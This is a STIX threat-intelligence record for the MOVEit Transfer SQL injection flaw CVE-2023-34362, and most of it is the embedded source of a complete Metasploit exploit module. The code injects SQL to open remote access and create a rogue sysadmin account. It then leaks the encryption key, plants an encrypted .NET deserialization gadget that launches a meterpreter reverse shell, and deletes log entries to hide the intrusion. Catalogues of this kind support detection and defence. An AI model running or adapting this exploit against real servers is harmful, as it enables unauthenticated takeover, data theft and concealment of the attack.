{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--042c4491-a1af-4785-9c69-370077f8412a",
    "created": "2024-08-14T16:53:04.673926Z",
    "modified": "2024-08-14T16:53:04.67393Z",
    "name": "MOVEit SQL Injection vulnerability",
    "description": " This module exploits an SQL injection vulnerability in the MOVEit Transfer web application that allows an unauthenticated attacker to gain access to MOVEit Transfer\u2019s database. Depending on the database engine being used (MySQL, Microsoft SQL Server, or Azure SQL), an attacker can leverage an information leak be able to upload a .NET deserialization payload.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/moveit_cve_2023_34362.rb",
            "external_id": "moveit_cve_2023_34362.rb"
        },
        {
            "source_name": "sfewer-r7",
            "external_id": "#PoChttps://github.com/sfewer-r7/CVE-2023-34362"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-34362"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/sfewer-r7/CVE-2023-34362"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/mXmV0YpC3W/cve-2023-34362/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://www.wiz.io/blog/cve-2023-34362"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MOVEit SQL Injection vulnerability',\n        'Description' => %q{\n          This module exploits an SQL injection vulnerability in the MOVEit Transfer web application\n          that allows an unauthenticated attacker to gain access to MOVEit Transfer\u2019s database.\n          Depending on the database engine being used (MySQL, Microsoft SQL Server, or Azure SQL), an\n          attacker can leverage an information leak be able to upload a .NET deserialization payload.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'sfewer-r7', # PoC https://github.com/sfewer-r7/CVE-2023-34362\n          'rbowes-r7', # research\n          'bwatters-r7' # module\n        ],\n        'References' => [\n          ['CVE', '2023-34362' ],\n          ['URL', 'https://github.com/sfewer-r7/CVE-2023-34362'],\n          ['URL', 'https://attackerkb.com/topics/mXmV0YpC3W/cve-2023-34362/rapid7-analysis'],\n          ['URL', 'https://www.wiz.io/blog/cve-2023-34362']\n        ],\n        'Platform' => 'win',\n        'Arch' => [ARCH_CMD],\n        'Payload' => {\n          'Space' => 345\n        },\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/http/x64/meterpreter/reverse_tcp',\n                'RPORT' => 443,\n                'SSL' => true\n              }\n            }\n          ],\n        ],\n        'DisclosureDate' => '2023-05-31',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]\n        }\n      )\n    )\n    register_options(\n      [\n        Msf::OptString.new('TARGET_URI', [ false, 'Target URI', '/api/v1/token']),\n        Msf::OptString.new('USERNAME', [ true, 'Username', Rex::Text.rand_text_alphanumeric(5..11)]),\n        Msf::OptString.new('LOGIN_NAME', [ true, 'Login Name', Rex::Text.rand_text_alphanumeric(5..11)]),\n        Msf::OptString.new('PASSWORD', [ true, 'Password', Rex::Text.rand_text_alphanumeric(5..11)])\n      ]\n    )\n    @moveit_token = nil\n    @moveit_instid = nil\n    @guest_email_addr = \"#{Rex::Text.rand_text_alphanumeric(5..12)}@#{Rex::Text.rand_text_alphanumeric(3..6)}.com\"\n    @uploadfile_name = Rex::Text.rand_text_alphanumeric(8..15)\n    @uploadfile_size = rand(5..64)\n    @uploadfile_data = Rex::Text.rand_text_alphanumeric(@uploadfile_size)\n    @user_added = false\n    @files_json = nil\n  end\n\n  def begin_file_upload(folders_json, token_json)\n    boundary = rand_text_numeric(27)\n    post_data = \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"name\\\"\\r\\n\\r\\n#{@uploadfile_name}\\r\\n--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"size\\\"\\r\\n\\r\\n#{@uploadfile_size}\\r\\n--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"comments\\\"\\r\\n\\r\\n\\r\\n--#{boundary}--\\r\\n\"\n    res = send_request_raw({\n      'method' => 'POST',\n      'uri' => normalize_uri(\"/api/v1/folders/#{folders_json['items'][0]['id']}/files?uploadType=resumable\"),\n      'headers' => {\n        'Content-Type' => 'multipart/form-data; boundary=' + boundary,\n        'Authorization' => \"Bearer #{token_json['access_token']}\"\n      },\n      'connection' => 'close',\n      'accept' => '*/*',\n      'data' => post_data.to_s\n    })\n\n    fail_with(Msf::Exploit::Failure::Unknown, \"Couldn't post API files #1 (#{files_response.body})\") if res.nil? || res.code != 200\n\n    files_json = res.get_json_document\n    vprint_status(\"Initiated resumable file upload for fileId '#{files_json['fileId']}'...\")\n    files_json\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri('moveitisapi/moveitisapi.dll?action=capa'),\n      'connection' => 'close',\n      'accept' => '*/*'\n    })\n    version = nil\n    if res && res.code == 200 && res.headers.key?('X-MOVEitISAPI-Version')\n      version = Rex::Version.new(res.headers['X-MOVEitISAPI-Version'])\n      # 2020.1.x AKA 12.1.x\n      return Exploit::CheckCode::Appears if version >= Rex::Version.new('12.1.0') && version < Rex::Version.new('12.1.10')\n      # 2021.0.x AKA 13.0.x\n      return Exploit::CheckCode::Appears if version >= Rex::Version.new('13.0.0') && version < Rex::Version.new('13.0.8')\n      # 2021.1.x AKA 13.1.x\n      return Exploit::CheckCode::Appears if version >= Rex::Version.new('13.1.0') && version < Rex::Version.new('13.1.6')\n      # 2022.0.x AKA 14.0.x\n      return Exploit::CheckCode::Appears if version >= Rex::Version.new('14.0.0') && version < Rex::Version.new('14.0.6')\n      # 2022.1.x AKA 14.1.x\n      return Exploit::CheckCode::Appears if version >= Rex::Version.new('14.1.0') && version < Rex::Version.new('14.1.7')\n      # 2023.0.x AKA 15.0.x\n      return Exploit::CheckCode::Appears if version >= Rex::Version.new('15.0.0') && version < Rex::Version.new('15.0.3')\n    else\n      return Exploit::CheckCode::Safe\n    end\n    return Exploit::CheckCode::Unknown\n  end\n\n  def cleanup\n    cleanup_user(@files_json) if @user_added\n    super\n  end\n\n  def cleanup_user(files_json)\n    hax_username = datastore['USERNAME']\n    hax_loginname = datastore['LOGIN_NAME']\n    deleteuser_payload = [\n      \"DELETE FROM moveittransfer.fileuploadinfo WHERE FileID='#{files_json['fileId']}'\", # delete the deserialization payload\n      \"DELETE FROM moveittransfer.files WHERE UploadUsername='#{hax_username}'\", # delete the file we uploaded\n      \"DELETE FROM moveittransfer.activesessions WHERE Username='#{hax_username}'\", #\n      \"DELETE FROM moveittransfer.users WHERE Username='#{hax_username}'\", # delete the user account we created\n      \"DELETE FROM moveittransfer.log WHERE Username='#{hax_username}'\", # The web ASP stuff logs by username\n      \"DELETE FROM moveittransfer.log WHERE Username='#{hax_loginname}'\", # The API logs by loginname\n      \"DELETE FROM moveittransfer.log WHERE Username='Guest:#{@guest_email_addr}'\", # The SQLi generates a guest log entry.\n    ]\n    if @user_added\n      vprint_status(\"Deleting user #{hax_username}\")\n      sqli(sqli_payload(deleteuser_payload))\n      @user_added = false\n    end\n  end\n\n  def create_sysadmin\n    hax_username = datastore['USERNAME']\n    hax_password = datastore['PASSWORD']\n    hax_loginname = datastore['LOGIN_NAME']\n    createuser_payload = [\n      \"UPDATE moveittransfer.hostpermits SET Host='*.*.*.*' WHERE Host!='*.*.*.*'\",\n      \"INSERT INTO moveittransfer.users (Username) VALUES ('#{hax_username}')\",\n      \"UPDATE moveittransfer.users SET LoginName='#{hax_loginname}' WHERE Username='#{hax_username}'\",\n      \"UPDATE moveittransfer.users SET InstID='#{@moveit_instid}' WHERE Username='#{hax_username}'\",\n      \"UPDATE moveittransfer.users SET Password='#{makev1password(hax_password, Rex::Text.rand_text_alphanumeric(4))}' WHERE Username='#{hax_username}'\",\n      \"UPDATE moveittransfer.users SET Permission='40' WHERE Username='#{hax_username}'\",\n      \"UPDATE moveittransfer.users SET CreateStamp=NOW() WHERE Username='#{hax_username}'\",\n    ]\n    res = sqli(sqli_payload(createuser_payload))\n\n    fail_with(Msf::Exploit::Failure::Unknown, \"Couldn't perform initial SQLi (#{res.body})\") if res.code != 200\n    @user_added = true\n  end\n\n  def encrypt_deserialization_gadget(gadget, org_key)\n    org_key = org_key.gsub(' ', '')\n    org_key = [org_key].pack('H*').bytes.pack('C*')\n    deserialization_gadget = moveitv2encrypt(gadget, org_key)\n    deserialization_gadget\n  end\n\n  def find_folder_id(token_json)\n    folders_response = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri('/api/v1/folders'),\n      'connection' => 'close',\n      'accept' => '*/*',\n      'headers' => {\n        'Authorization' => \"Bearer #{token_json['access_token']}\"\n      }\n    })\n    fail_with(Msf::Exploit::Failure::Unknown, \"Couldn't get API folders (#{folders_response.body})\") if folders_response.nil? || folders_response.code != 200\n    folders_json = JSON.parse(folders_response.body)\n    vprint_status(\"Found folderId '#{folders_json['items'][0]['id']}'.\")\n    folders_json\n  end\n\n  def get_csrf_token(res)\n    fail_with(Msf::Exploit::Failure::Unknown, 'No csrf token, or my code is bad') unless res.to_s.split(/\\n/).join =~ /.*csrftoken\" value=\"([a-f0-9]*)\"/\n    ::Regexp.last_match(1)\n  end\n\n  def guestaccess_request(body)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'uri' => normalize_uri('guestaccess.aspx'),\n      'connection' => 'close',\n      'accept' => '*/*',\n      'vars_post' => body\n    })\n    res\n  end\n\n  # Perform a request to the ISAPI endpoint with an arbitrary transaction\n  def isapi_request(transaction, headers)\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri('moveitisapi/moveitisapi.dll?action=m2'),\n      'keep_cookies' => true,\n      'connection' => 'close',\n      'accept' => '*/*',\n      'headers' => {\n        'X-siLock-Test': 'abcdX-SILOCK-Transaction: folder_add_by_path',\n        'X-siLock-Transaction': transaction\n      }.merge(headers)\n    })\n  end\n\n  def leak_encryption_key(token_json, files_json)\n    haxleak_payload = [\n      # The \\ gets escaped, so we leverage CHAR_LENGTH(39) to get the key we want (Standard Networks\\siLock\\Institutions\\0) as all other KeyName's will be longer (Standard Networks\\siLock\\Institutions\\1234)\n      \"UPDATE moveittransfer.files SET UploadAgentBrand=(SELECT PairValue FROM moveittransfer.registryaudit WHERE PairName='Key' AND CHAR_LENGTH(KeyName)=#{'Standard Networks\\siLock\\Institutions\\0'.length}) WHERE ID='#{files_json['fileId']}'\"\n    ]\n\n    sqli(sqli_payload(haxleak_payload))\n\n    leak_response = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(\"/api/v1/files/#{files_json['fileId']}\"),\n      'connection' => 'close',\n      'accept' => '*/*',\n      'headers' => {\n        'Authorization' => \"Bearer #{token_json['access_token']}\"\n      }\n    })\n\n    fail_with(Msf::Exploit::Failure::Unknown, \"Couldn't post API files #LEAK (#{leak_response.body})\") if leak_response.nil? || leak_response.code != 200\n    leak_json = JSON.parse(leak_response.body)\n    org_key = leak_json['uploadAgentBrand']\n    vprint_status(\"Leaked the Org Key: #{org_key}\")\n    org_key\n  end\n\n  def makev1password(password, salt = 'AAAA')\n    fail_with(Msf::Exploit::Failure::BadConfig, 'password cannot be empty') if password.empty?\n    fail_with(Msf::Exploit::Failure::BadConfig, 'salt must be 4 bytes') if salt.length != 4\n\n    # These two hardcoded values are found in MOVEit.DMZ.Core.Cryptography.Providers.SecretProvider.GetSecret\n    pwpre = Base64.decode64('=VT2jkEH3vAs=')\n    pwpost = Base64.decode64('=0maaSIA5oy0=')\n    md5 = Digest::MD5.new\n    md5.update(pwpre)\n    md5.update(salt)\n    md5.update(password)\n    md5.update(pwpost)\n\n    pw = [(4 + 4 + 16), 0, 0, 0].pack('CCCC')\n    pw << salt\n    pw << md5.digest\n\n    return Base64.strict_encode64(pw).gsub('+', '-')\n  end\n\n  def moveitv2encrypt(data, org_key, iv = nil, tag = '@%!')\n    fail_with(Msf::Exploit::Failure::BadConfig, 'org_key must be 16 bytyes') if org_key.length != 16\n\n    if iv.nil?\n      iv = Rex::Text.rand_text_alphanumeric(4)\n      # as we only store the first 4 bytes in the header, the IV must be a repeating 4 byte sequence.\n      iv *= 4\n    end\n\n    # MOVEit.DMZ.Core.Cryptography.Encryption\n    key = [64, 131, 232, 51, 134, 103, 230, 30, 48, 86, 253, 157].pack('C*')\n    key += org_key\n    key += [0, 0, 0, 0].pack('C*')\n\n    # MOVEit.Crypto.AesMOVEitCryptoTransform\n    cipher = OpenSSL::Cipher.new('AES-256-CBC')\n\n    cipher.encrypt\n    cipher.key = key\n    cipher.iv = iv\n    encrypted_data = cipher.update(data) + cipher.final\n    data_sha1_hash = Digest::SHA1.digest(data).unpack('C*')\n    org_key_sha1_hash = Digest::SHA1.digest(org_key).unpack('C*')\n\n    # MOVEit.DMZ.Core.Cryptography.Providers.MOVEit.MOVEitV2EncryptedStringHeader\n    header = [\n      225, # MOVEitV2EncryptedStringHeader\n      0,\n      data_sha1_hash[0],\n      data_sha1_hash[1],\n      org_key_sha1_hash[0],\n      org_key_sha1_hash[1],\n      org_key_sha1_hash[2],\n      org_key_sha1_hash[3],\n      iv.unpack('C*')[0],\n      iv.unpack('C*')[1],\n      iv.unpack('C*')[2],\n      iv.unpack('C*')[3],\n    ].pack('C*')\n\n    # MOVEit.DMZ.Core.Cryptography.Encryption\n    return tag + Base64.strict_encode64(header + encrypted_data)\n  end\n\n  def populate_token_instid\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'keep_cookies' => true,\n        'connection' => 'keep-alive',\n        'accept' => '*/*'\n      })\n\n      cookies = res.get_cookies\n      # Get the session id from the cookies\n      fail_with(Msf::Exploit::Failure::Unknown, 'Could not find token from cookies!') unless cookies =~ /ASP.NET_SessionId=([a-z0-9]+);/\n      @moveit_token = ::Regexp.last_match(1)\n      vprint_status(\"Received ASP.NET_SessionId cookie: #{@moveit_token}\")\n\n      # Get the InstID from the cookies\n      fail_with(Msf::Exploit::Failure::Unknown, 'Could not find InstID from cookies!') unless cookies =~ /siLockLongTermInstID=([0-9]+);/\n      @moveit_instid = ::Regexp.last_match(1)\n      vprint_status(\"Received siLockLongTermInstID cookie: #{@moveit_instid}\")\n    end\n    true\n  end\n\n  def request_api_token\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri('/api/v1/token'),\n      'Content-Type' => 'application/x-www-form-urlencoded',\n      'connection' => 'keep-alive',\n      'accept' => '*/*',\n      'vars_post' => {\n        'grant_type' => 'password',\n        'username' => datastore['LOGIN_NAME'],\n        'password' => datastore['PASSWORD']\n      }\n    })\n\n    fail_with(Msf::Exploit::Failure::Unknown, \"Couldn't get API token (#{res.body})\") if res.code != 200\n\n    token_json = JSON.parse(res.body)\n    vprint_status(\"Got API access token='#{token_json['access_token']}'.\")\n    token_json\n  end\n\n  def set_session(session_hash)\n    session_vars = {}\n    session_index = 0\n    session_hash.each_pair do |k, v|\n      session_vars[\"X-siLock-SessVar#{session_index}\"] = \"#{k}: #{v}\"\n      session_index += 1\n    end\n    isapi_request('session_setvars', session_vars)\n  end\n\n  def sqli(sql_payload)\n    # Set up a fake package in the session. The order here is important. We set these session\n    # variables one per request, so first set the package information, then switch over to a\n    # 'Guest' username to allow the CSRF/injection to work as expected. If we don't do this\n    # order the session will be cleared and the injection will not work.\n    set_session({\n      'MyPkgAccessCode' => 'accesscode', # Must match the final request Arg06\n      'MyPkgID' => '0', # Is self provisioned? (must be 0)\n      'MyGuestEmailAddr' => @guest_email_addr, # Must be a valid email address @ MOVEit.DMZ.ClassLib.dll/MOVEit.DMZ.ClassLib/MsgEngine.cs\n      'MyPkgInstID' => '1234', # this can be any int value\n      'MyPkgSelfProvisionedRecips' => sql_payload,\n      'MyUsername' => 'Guest'\n    })\n\n    # Get a CSRF token - this has to be *after* you set MyUsername, since the\n    # username is incorporated into it\n    #\n    # Transaction => request type, different types will work\n    # Arg06 => the package access code (must match what's set above)\n    # Arg12 => promptaccesscode requests a form, which contains a CSRF code\n\n    body = { 'Transaction' => 'dummy', 'Arg06' => 'accesscode', 'Arg12' => 'promptaccesscode' }\n    csrf = get_csrf_token(guestaccess_request(body))\n\n    # This does the actual injection\n    body = {\n      'Arg06' => 'accesscode',\n      'transaction' => 'secmsgpost',\n      'Arg01' => 'subject',\n      'Arg04' => 'body',\n      'Arg05' => 'sendauto',\n      'Arg09' => 'pkgtest9',\n      'csrftoken' => csrf\n    }\n    guestaccess_request(body)\n  end\n\n  def sqli_payload(sql_payload)\n    # Create the initial injection, and create the session object\n    payload = [\n      # The initial injection\n      \"#{Rex::Text.rand_text_alphanumeric(8)}@#{Rex::Text.rand_text_alphanumeric(8)}.com')\",\n    ].concat(sql_payload)\n\n    # Join our payload, and terminate with a comment character\n    return payload.join(';') + ';#'\n  end\n\n  def trigger_deserialization(token_json, files_json, folders_json)\n    files_response = send_request_cgi({\n      'method' => 'PUT',\n      'uri' => normalize_uri(\"/api/v1/folders/#{folders_json['items'][0]['id']}/files?uploadType=resumable&fileId=#{files_json['fileId']}\"),\n      'connection' => 'close',\n      'accept' => '*/*',\n      'verify' => false,\n      'headers' => {\n        'Authorization' => \"Bearer #{token_json['access_token']}\",\n        'Content-Type' => 'application/octet-stream',\n        'Content-Range' => \"bytes 0-#{@uploadfile_size - 1}/#{@uploadfile_size}\",\n        'X-File-Hash' => Digest::SHA1.hexdigest(@uploadfile_data)\n      },\n      'data' => @uploadfile_data\n    })\n\n    # 500 if payload runs :)\n    fail_with(Msf::Exploit::Failure::Unknown, \"Couldn't post API files #2 code=#{files_response.code} (#{files_response.body})\") if files_response.code != 500\n  end\n\n  def upload_encrypted_gadget(encrypted_gadget, files_json)\n    haxupload_payload = [\n      \"UPDATE moveittransfer.fileuploadinfo SET State='#{encrypted_gadget}' WHERE FileID='#{files_json['fileId']}'\",\n    ]\n    vprint_status('Planting encrypted gadget into the DB...')\n    sqli(sqli_payload(haxupload_payload))\n  end\n\n  def exploit\n    # Get the sessionID and siLockLongTermInstID\n    print_status('[01/11] Get the sessionID and siLockLongTermInstID')\n    populate_token_instid\n    # Allow Remote Access and Create new sysAd\n    print_status('[02/11] Create New Sysadmin')\n    create_sysadmin\n    print_status('[03/11] Get API Token')\n    token_json = request_api_token\n    print_status('[04/11] Get Folder ID')\n    folders_json = find_folder_id(token_json)\n    print_status('[05/11] Begin File Upload')\n    @files_json = begin_file_upload(folders_json, token_json)\n    print_status('[06/11] Leak Encryption Key')\n    org_key = leak_encryption_key(token_json, @files_json)\n    print_status('[07/11] Generate Gadget')\n    gadget = ::Msf::Util::DotNetDeserialization.generate(\n      payload.encoded,\n      gadget_chain: :TextFormattingRunProperties,\n      formatter: :BinaryFormatter\n    )\n    print_status('[08/11] Encrypt Gadget')\n    b64_gadget = Rex::Text.encode_base64(gadget)\n    encrypted_gadget = encrypt_deserialization_gadget(b64_gadget, org_key)\n    print_status('[09/11] Upload Encrypted Gadget')\n    upload_encrypted_gadget(encrypted_gadget, @files_json)\n    print_status('[10/11] Trigger Gadget')\n    trigger_deserialization(token_json, @files_json, folders_json)\n    print_status('[11/11] Cleaning Up')\n    cleanup_user(@files_json)\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-05-31",
    "x_mitre_platforms": [
        "win'"
    ]
}